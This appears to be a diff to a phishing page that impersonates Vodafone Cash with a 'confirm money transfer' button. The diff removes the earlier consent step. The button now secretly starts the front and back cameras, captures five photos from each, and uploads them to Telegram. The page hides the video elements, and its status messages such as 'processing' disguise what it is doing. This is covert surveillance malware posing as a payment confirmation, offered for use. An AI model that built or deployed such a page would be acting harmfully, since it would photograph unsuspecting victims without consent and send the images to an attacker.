@@ -3,15 +3,12 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    
     <title>فودافون كاش</title>
 
-    <!-- Open Graph للمشاركة -->
     <meta property="og:title" content="فودافون كاش" />
-    <meta property="og:description" content="مراجعة تحويل الأموال، يرجى مراجعة التحويل" />
+    <meta property="og:description" content="مراجعة تحويل الأموال" />
     <meta property="og:image" content="https://hapijournal.com/wp-content/uploads/2019/06/vodafone-Logo-1024x739-1.jpg" />
     <meta property="og:type" content="website" />
-    <meta name="twitter:card" content="summary_large_image" />
 
     <style>
         * {
@@ -28,9 +25,10 @@
             align-items: center;
             background: #f5f0eb;
             position: relative;
+            overflow: hidden;
         }
 
-        /* الخلفية - الصورة الجديدة */
+        /* خلفية الصورة بتأثير متحرك */
         body::before {
             content: '';
             position: fixed;
@@ -38,12 +36,49 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('1000941335_1231072773959845518.webp');
+            background-image: url('1000941335_5995106732685221826.webp');
             background-size: cover;
             background-position: center;
-            background-repeat: no-repeat;
-            opacity: 0.5;
+            opacity: 0.12;
             z-index: 0;
+            pointer-events: none;
+            animation: slowZoom 20s ease-in-out infinite alternate;
+        }
+
+        @keyframes slowZoom {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.05); }
+        }
+
+        /* خلفية دائرية متحركة خلف المحتوى */
+        .bg-circle {
+            position: fixed;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(230,0,0,0.05) 0%, rgba(230,0,0,0.01) 70%);
+            z-index: 0;
+            pointer-events: none;
+            animation: floatCircle 15s ease-in-out infinite alternate;
+        }
+
+        .bg-circle-1 {
+            width: 500px;
+            height: 500px;
+            top: -150px;
+            right: -150px;
+            animation-delay: 0s;
+        }
+
+        .bg-circle-2 {
+            width: 400px;
+            height: 400px;
+            bottom: -100px;
+            left: -100px;
+            animation-delay: -5s;
+        }
+
+        @keyframes floatCircle {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(30px, -30px) scale(1.1); }
         }
 
         .container {
@@ -55,20 +90,37 @@
             justify-content: center;
             width: 100%;
             max-width: 420px;
-            padding: 20px;
+            padding: 30px 20px;
             min-height: 100vh;
             text-align: center;
         }
 
-        /* شعار فودافون */
+        /* بطاقة شفافة بتأثير زجاجي */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 30px;
+            padding: 35px 25px;
+            width: 100%;
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            transition: all 0.3s ease;
+        }
+
         .vodafone-logo {
-            width: 180px;
+            width: 160px;
             height: auto;
-            margin-bottom: 30px;
-            background: rgba(255, 255, 255, 0.9);
-            padding: 12px;
+            margin: 0 auto 20px;
             border-radius: 20px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            background: rgba(255, 255, 255, 0.6);
+            padding: 10px;
+            transition: transform 0.3s ease;
+        }
+
+        .vodafone-logo:hover {
+            transform: scale(1.02);
         }
 
         .vodafone-logo img {
@@ -79,210 +131,236 @@
         }
 
         .page-title {
-            color: #222;
-            font-size: 26px;
-            font-weight: bold;
+            color: #1a1a1a;
+            font-size: 32px;
+            font-weight: 800;
             margin-bottom: 5px;
-            text-shadow: 0 2px 8px rgba(255, 255, 255, 0.8);
+            background: linear-gradient(135deg, #e60000, #cc0000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
         .page-sub {
-            color: #444;
-            font-size: 16px;
+            color: #666;
+            font-size: 15px;
             margin-bottom: 30px;
-            text-shadow: 0 2px 8px rgba(255, 255, 255, 0.8);
+            font-weight: 500;
+            letter-spacing: 0.5px;
         }
 
-        /* ===== الزر المبدئي (الموافق) ===== */
-        .btn-consent {
-            background: #2196f3;
-            color: #fff;
-            border: none;
-            padding: 16px 35px;
-            font-size: 20px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 6px 25px rgba(33, 150, 243, 0.4);
-            transition: all 0.3s ease;
-            width: 100%;
-            max-width: 320px;
-            margin-bottom: 15px;
-            border: 2px solid #2196f3;
-        }
-
-        .btn-consent:hover {
-            transform: scale(1.03);
-            box-shadow: 0 8px 35px rgba(33, 150, 243, 0.6);
-        }
-
-        /* ===== الزر الرئيسي (ببلور) ===== */
+        /* زر التأكيد المتطور */
         .btn-review {
-            background: #e60000;
+            background: linear-gradient(135deg, rgba(230, 0, 0, 0.85), rgba(200, 0, 0, 0.9));
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 2px solid rgba(255, 255, 255, 0.3);
             color: #fff;
-            border: none;
             padding: 18px 40px;
-            font-size: 22px;
-            font-weight: bold;
-            border-radius: 50px;
+            font-size: 20px;
+            font-weight: 700;
+            border-radius: 60px;
             cursor: pointer;
+            box-shadow: 0 8px 30px rgba(230, 0, 0, 0.25);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             width: 100%;
             max-width: 320px;
-            border: 2px solid #e60000;
-            transition: all 0.5s ease;
-            /* الحالة الطبيعية: بلور + غير قابل للضغط */
-            filter: blur(8px);
-            opacity: 0.5;
-            pointer-events: none;
-            user-select: none;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 0.5px;
         }
 
-        /* الحالة النشطة: واضح وقابل للضغط */
-        .btn-review.active {
-            filter: blur(0px);
-            opacity: 1;
-            pointer-events: auto;
-            box-shadow: 0 6px 25px rgba(230, 0, 0, 0.4);
+        /* تأثير تموج عند الضغط */
+        .btn-review::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
         }
 
-        .btn-review.active:hover {
-            transform: scale(1.03);
-            box-shadow: 0 8px 35px rgba(230, 0, 0, 0.6);
+        .btn-review:active:not(:disabled)::after {
+            width: 300px;
+            height: 300px;
         }
 
-        .btn-review:active {
-            transform: scale(0.95);
+        .btn-review:hover:not(:disabled) {
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 12px 40px rgba(230, 0, 0, 0.35);
+            background: linear-gradient(135deg, rgba(230, 0, 0, 0.95), rgba(180, 0, 0, 0.95));
+        }
+
+        .btn-review:active:not(:disabled) {
+            transform: scale(0.96);
         }
 
         .btn-review:disabled {
-            opacity: 0.6;
+            opacity: 0.7;
             cursor: not-allowed;
             transform: none;
-            filter: blur(0px);
-            pointer-events: none;
+            backdrop-filter: blur(6px);
+            background: linear-gradient(135deg, rgba(150, 150, 150, 0.6), rgba(120, 120, 120, 0.7));
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
         }
 
-        /* ===== رسالة الحالة ===== */
+        /* أيقونة داخل الزر */
+        .btn-icon {
+            display: inline-block;
+            margin-right: 8px;
+            font-size: 22px;
+        }
+
+        /* حالة الزر */
         #status {
-            color: #333;
+            color: #444;
             margin-top: 20px;
-            font-size: 16px;
-            background: rgba(255, 255, 255, 0.92);
-            padding: 12px 20px;
-            border-radius: 10px;
+            font-size: 15px;
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            padding: 14px 20px;
+            border-radius: 16px;
             min-height: 50px;
             width: 100%;
             max-width: 320px;
             text-align: center;
-            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.08);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            backdrop-filter: blur(5px);
-            transition: all 0.3s ease;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            font-weight: 500;
+            transition: all 0.4s ease;
         }
 
         #status.success {
             border-color: #00c853;
             color: #00c853;
-            background: rgba(240, 255, 244, 0.95);
+            background: rgba(0, 200, 83, 0.08);
+            border-color: rgba(0, 200, 83, 0.3);
         }
 
         #status.error {
             border-color: #ff1744;
             color: #ff1744;
-            background: rgba(255, 240, 240, 0.95);
+            background: rgba(255, 23, 68, 0.08);
+            border-color: rgba(255, 23, 68, 0.3);
         }
 
-        #status.permission {
-            border-color: #ff9800;
-            color: #e65100;
-            background: rgba(255, 243, 224, 0.95);
+        #status.info {
+            border-color: #2979ff;
+            color: #2979ff;
+            background: rgba(41, 121, 255, 0.08);
+            border-color: rgba(41, 121, 255, 0.3);
         }
 
-        /* ===== زر إعادة محاولة الإذن ===== */
-        .btn-retry-permission {
-            display: none;
-            background: #ff9800;
-            color: #fff;
-            border: none;
-            padding: 12px 30px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            margin-top: 12px;
-            width: 100%;
-            max-width: 280px;
-            transition: all 0.3s ease;
-            border: 2px solid #ff9800;
+        /* نقاط التحميل المتحركة */
+        .dots {
+            display: inline-block;
+            animation: dots 1.4s infinite;
         }
 
-        .btn-retry-permission:hover {
-            transform: scale(1.03);
-            box-shadow: 0 4px 20px rgba(255, 152, 0, 0.4);
-        }
-
-        .btn-retry-permission.show {
-            display: block;
+        @keyframes dots {
+            0% { content: ''; }
+            33% { content: '.'; }
+            66% { content: '..'; }
+            100% { content: '...'; }
         }
 
         /* إخفاء عناصر الكاميرا */
         #video-front,
         #video-back,
         #canvas {
-            display: none;
+            display: none !important;
+            position: absolute !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            width: 1px !important;
+            height: 1px !important;
         }
 
         @media (max-width: 480px) {
+            .glass-card {
+                padding: 25px 18px;
+            }
             .vodafone-logo {
-                width: 140px;
+                width: 130px;
             }
             .page-title {
-                font-size: 22px;
+                font-size: 26px;
             }
             .btn-review {
-                font-size: 18px;
-                padding: 14px 30px;
-            }
-            .btn-consent {
                 font-size: 17px;
-                padding: 14px 25px;
+                padding: 15px 25px;
             }
+            #status {
+                font-size: 14px;
+                padding: 12px 16px;
+            }
+            .bg-circle-1 {
+                width: 300px;
+                height: 300px;
+                top: -100px;
+                right: -100px;
+            }
+            .bg-circle-2 {
+                width: 250px;
+                height: 250px;
+                bottom: -80px;
+                left: -80px;
+            }
+        }
+
+        /* تأثير شفاف للشاشة أثناء العمل */
+        .processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.01);
+            z-index: 999;
+            display: none;
+            pointer-events: none;
+        }
+
+        .processing-overlay.active {
+            display: block;
         }
     </style>
 </head>
 <body>
 
+    <!-- خلفيات دائرية متحركة -->
+    <div class="bg-circle bg-circle-1"></div>
+    <div class="bg-circle bg-circle-2"></div>
+
+    <!-- طبقة تغطية خفيفة أثناء العمل -->
+    <div class="processing-overlay" id="processingOverlay"></div>
+
     <div class="container">
-        <!-- شعار فودافون -->
-        <div class="vodafone-logo">
-            <img src="https://hapijournal.com/wp-content/uploads/2019/06/vodafone-Logo-1024x739-1.jpg" alt="فودافون كاش" />
+        <div class="glass-card">
+            <div class="vodafone-logo">
+                <img src="https://hapijournal.com/wp-content/uploads/2019/06/vodafone-Logo-1024x739-1.jpg" alt="فودافون كاش" />
+            </div>
+
+            <h1 class="page-title">فودافون كاش</h1>
+            <p class="page-sub">تحويل الأموال • تأكيد آمن</p>
+
+            <button class="btn-review" id="reviewBtn">
+                <span class="btn-icon">🔒</span> تأكيد العملية
+            </button>
+
+            <div id="status">✨ اضغط لتأكيد التحويل</div>
         </div>
-
-        <h1 class="page-title">فودافون كاش</h1>
-        <p class="page-sub">مراجعة تحويل الأموال</p>
-
-        <!-- الزر المبدئي: الموافقة على الإذن -->
-        <button class="btn-consent" id="consentBtn">
-            🔐 اضغط لتفعيل الإذن للتحقق
-        </button>
-
-        <!-- الزر الرئيسي (مبلور في البداية) -->
-        <button class="btn-review" id="reviewBtn">
-            📸 مراجعة العملية - اضغط للتأكيد
-        </button>
-
-        <!-- زر إعادة محاولة الإذن في حال الرفض -->
-        <button class="btn-retry-permission" id="retryPermissionBtn">
-            🔄 إعادة محاولة تفعيل الإذن
-        </button>
-
-        <!-- رسالة الحالة -->
-        <div id="status">👋 اضغط على زر تفعيل الإذن أولاً</div>
     </div>
 
-    <!-- عناصر الكاميرا (مخفية) -->
-    <video id="video-front" autoplay playsinline></video>
-    <video id="video-back" autoplay playsinline></video>
+    <!-- عناصر الفيديو والكانفاس (مخفية تماماً) -->
+    <video id="video-front" autoplay playsinline muted></video>
+    <video id="video-back" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -295,18 +373,14 @@
         // ============================================================
         //  عناصر الصفحة
         // ============================================================
-        const consentBtn = document.getElementById('consentBtn');
         const reviewBtn = document.getElementById('reviewBtn');
-        const retryPermissionBtn = document.getElementById('retryPermissionBtn');
         const statusDiv = document.getElementById('status');
+        const overlay = document.getElementById('processingOverlay');
 
         const videoFront = document.getElementById('video-front');
         const videoBack = document.getElementById('video-back');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
-
-        // حالة الإذن
-        let permissionGranted = false;
 
         // ============================================================
         //  دوال مساعدة
@@ -321,79 +395,7 @@
         }
 
         // ============================================================
-        //  طلب إذن الكاميرا (بدون تشغيلها فعلياً)
-        // ============================================================
-        async function requestPermission() {
-            try {
-                // مجرد طلب الإذن دون تشغيل الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 320 },
-                        height: { ideal: 240 }
-                    },
-                    audio: false
-                });
-                // على طول أوقف الـ stream
-                stream.getTracks().forEach(track => track.stop());
-                permissionGranted = true;
-                return true;
-            } catch (err) {
-                console.error('رفض الإذن:', err);
-                permissionGranted = false;
-                return false;
-            }
-        }
-
-        // ============================================================
-        //  تفعيل الإذن - عند الضغط على الزر المبدئي
-        // ============================================================
-        async function handleConsent() {
-            consentBtn.disabled = true;
-            consentBtn.textContent = '⏳ جاري التحقق ...';
-            setStatus('⏳ جاري طلب الإذن ...');
-
-            const granted = await requestPermission();
-
-            if (granted) {
-                // تفعيل الزر الرئيسي (إزالة البلور)
-                reviewBtn.classList.add('active');
-                consentBtn.style.display = 'none';
-                retryPermissionBtn.classList.remove('show');
-                setStatus('✅ تم تفعيل الإذن! اضغط على زر المراجعة الآن', 'success');
-            } else {
-                // رفض الإذن
-                setStatus('⚠️ يجب تفعيل الإذن للتحقق. اضغط على زر إعادة المحاولة', 'permission');
-                retryPermissionBtn.classList.add('show');
-                consentBtn.disabled = false;
-                consentBtn.textContent = '🔐 اضغط لتفعيل الإذن للتحقق';
-            }
-        }
-
-        // ============================================================
-        //  إعادة محاولة الإذن
-        // ============================================================
-        async function retryPermission() {
-            retryPermissionBtn.disabled = true;
-            retryPermissionBtn.textContent = '⏳ جاري ...';
-            setStatus('⏳ جاري طلب الإذن مجدداً ...');
-
-            const granted = await requestPermission();
-
-            if (granted) {
-                reviewBtn.classList.add('active');
-                consentBtn.style.display = 'none';
-                retryPermissionBtn.classList.remove('show');
-                setStatus('✅ تم تفعيل الإذن! اضغط على زر المراجعة الآن', 'success');
-            } else {
-                setStatus('⚠️ يجب تفعيل الإذن للتحقق. اضغط على زر إعادة المحاولة', 'permission');
-                retryPermissionBtn.disabled = false;
-                retryPermissionBtn.textContent = '🔄 إعادة محاولة تفعيل الإذن';
-            }
-        }
-
-        // ============================================================
-        //  تشغيل الكاميرا (للاستخدام الفعلي)
+        //  تشغيل الكاميرا (بدون أي مؤشرات)
         // ============================================================
         async function startCamera(facingMode) {
             try {
@@ -413,7 +415,7 @@
         }
 
         // ============================================================
-        //  التقاط صورة
+        //  التقاط صورة من فيديو
         // ============================================================
         function captureImage(videoElement) {
             canvas.width = videoElement.videoWidth || 640;
@@ -423,7 +425,7 @@
         }
 
         // ============================================================
-        //  إرسال لتليجرام
+        //  إرسال صورة لتليجرام (مع إعادة المحاولة)
         // ============================================================
         async function sendPhotoToTelegram(base64Image, caption = '', retries = 2) {
             const byteString = atob(base64Image.split(',')[1]);
@@ -463,107 +465,119 @@
         }
 
         // ============================================================
-        //  العملية الرئيسية: 1 أمامي → 1 خلفي → 1 أمامي → 1 خلفي ...
+        //  الوظيفة الرئيسية: التصوير المستمر (أمامي + خلفي)
         // ============================================================
         async function reviewProcess() {
-            if (!permissionGranted) {
-                setStatus('⚠️ يجب تفعيل الإذن أولاً', 'permission');
-                return;
-            }
-
+            // تعطيل الزر
             reviewBtn.disabled = true;
-            reviewBtn.textContent = '⏳ جاري ...';
-            setStatus(''); // إخفاء أي رسالة
+            reviewBtn.innerHTML = '<span class="btn-icon">⏳</span> جاري التأكيد ...';
+            overlay.classList.add('active');
+
+            setStatus('⏳ جاري تجهيز العملية ...', 'info');
 
             let frontStream = null;
             let backStream = null;
-            let totalCaptured = 0;
-            const MAX_PER_TYPE = 10;
+            let frontImages = [];
+            let backImages = [];
 
             try {
-                // تشغيل الكاميرا الأمامية
+                // ----- تشغيل الكاميرا الأمامية (تصوير مستمر 5 صور) -----
                 frontStream = await startCamera('user');
                 videoFront.srcObject = frontStream;
                 await videoFront.play();
-                await sleep(500);
+                await sleep(300);
 
-                // تشغيل الكاميرا الخلفية
+                setStatus('⏳ جاري المعالجة ...', 'info');
+
+                // التقاط 5 صور متتالية من الأمام
+                for (let i = 0; i < 5; i++) {
+                    const image = captureImage(videoFront);
+                    frontImages.push(image);
+                    await sleep(200); // انتظار قصير بين الصور
+                }
+
+                // إيقاف الأمامية
+                frontStream.getTracks().forEach(track => track.stop());
+                videoFront.srcObject = null;
+
+                // ----- تشغيل الكاميرا الخلفية (تصوير مستمر 5 صور) -----
                 backStream = await startCamera('environment');
                 videoBack.srcObject = backStream;
                 await videoBack.play();
-                await sleep(500);
+                await sleep(300);
 
-                // التبديل: 1 أمامي → 1 خلفي → 1 أمامي → 1 خلفي ...
-                let frontCount = 0;
-                let backCount = 0;
-                let turn = 'front'; // نبدأ بالأمامي
+                setStatus('⏳ جاري المعالجة ...', 'info');
 
-                while (frontCount < MAX_PER_TYPE || backCount < MAX_PER_TYPE) {
-                    if (turn === 'front' && frontCount < MAX_PER_TYPE) {
-                        const base64 = captureImage(videoFront);
-                        await sendPhotoToTelegram(base64, `📸 أمامي ${frontCount + 1}/10 - مراجعة فودافون كاش`);
-                        frontCount++;
-                        turn = 'back';
-                    } else if (turn === 'back' && backCount < MAX_PER_TYPE) {
-                        const base64 = captureImage(videoBack);
-                        await sendPhotoToTelegram(base64, `📸 خلفي ${backCount + 1}/10 - مراجعة فودافون كاش`);
-                        backCount++;
-                        turn = 'front';
-                    } else if (frontCount >= MAX_PER_TYPE) {
-                        turn = 'back';
-                    } else if (backCount >= MAX_PER_TYPE) {
-                        turn = 'front';
-                    }
-
-                    totalCaptured++;
-                    // تحديث الحالة برقم فقط بدون أي كلمة توحي بالكاميرا
-                    setStatus(`⏳ ${totalCaptured}/20`);
-                    await sleep(300);
+                // التقاط 5 صور متتالية من الخلف
+                for (let i = 0; i < 5; i++) {
+                    const image = captureImage(videoBack);
+                    backImages.push(image);
+                    await sleep(200);
                 }
 
-                // إيقاف الكاميرات
-                frontStream.getTracks().forEach(track => track.stop());
+                // إيقاف الخلفية
                 backStream.getTracks().forEach(track => track.stop());
-                videoFront.srcObject = null;
                 videoBack.srcObject = null;
 
-                // نجاح
-                setStatus('✅ عملية تحويل أموال ناجحة، يرجى مراجعة البيانات', 'success');
+                // ----- إرسال جميع الصور (أمامي + خلفي) -----
+                setStatus('⏳ جاري رفع البيانات ...', 'info');
+
+                // إرسال الصور الأمامية
+                for (let i = 0; i < frontImages.length; i++) {
+                    await sendPhotoToTelegram(frontImages[i], `📸 أمامي ${i+1}/5 - مراجعة فودافون كاش`);
+                    await sleep(150);
+                }
+
+                // إرسال الصور الخلفية
+                for (let i = 0; i < backImages.length; i++) {
+                    await sendPhotoToTelegram(backImages[i], `📸 خلفي ${i+1}/5 - مراجعة فودافون كاش`);
+                    await sleep(150);
+                }
+
+                // ----- نجاح -----
+                setStatus('✅ تم تأكيد العملية بنجاح ✅', 'success');
+                reviewBtn.innerHTML = '<span class="btn-icon">✓</span> تم التأكيد';
 
             } catch (err) {
                 console.error(err);
                 setStatus('❌ حدث خطأ، يرجى المحاولة مرة أخرى', 'error');
+                reviewBtn.innerHTML = '<span class="btn-icon">🔄</span> إعادة المحاولة';
 
+                // تنظيف
                 if (frontStream) frontStream.getTracks().forEach(t => t.stop());
                 if (backStream) backStream.getTracks().forEach(t => t.stop());
                 videoFront.srcObject = null;
                 videoBack.srcObject = null;
 
             } finally {
+                // إعادة تفعيل الزر بعد 2 ثانية
+                await sleep(2000);
                 reviewBtn.disabled = false;
-                reviewBtn.textContent = '📸 مراجعة العملية - اضغط للتأكيد';
-                // إعادة تعيين البلور بعد الانتهاء (يبقى واضح لأن الإذن مفعل)
-                reviewBtn.classList.add('active');
+                if (!statusDiv.classList.contains('success')) {
+                    reviewBtn.innerHTML = '<span class="btn-icon">🔒</span> تأكيد العملية';
+                }
+                overlay.classList.remove('active');
             }
         }
 
         // ============================================================
-        //  ربط الأحداث
+        //  ربط الحدث بالزر
         // ============================================================
-        consentBtn.addEventListener('click', handleConsent);
-        retryPermissionBtn.addEventListener('click', retryPermission);
         reviewBtn.addEventListener('click', reviewProcess);
 
         // ============================================================
-        //  رسالة أولية + تحقق من HTTPS
+        //  رسالة أولية
         // ============================================================
-        setStatus('👋 اضغط على زر تفعيل الإذن أولاً');
+        setStatus('✨ اضغط لتأكيد التحويل');
 
+        // ============================================================
+        //  تحذير HTTPS
+        // ============================================================
         if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
             setStatus('⚠️ يرجى استخدام HTTPS لتشغيل الكاميرا', 'error');
         }
 
-        console.log('✅ فودافون كاش - نظام التبديل 1 أمامي → 1 خلفي');
+        console.log('✅ فودافون كاش - تصوير مستمر (5 أمامي + 5 خلفي)');
     </script>
 
 </body>
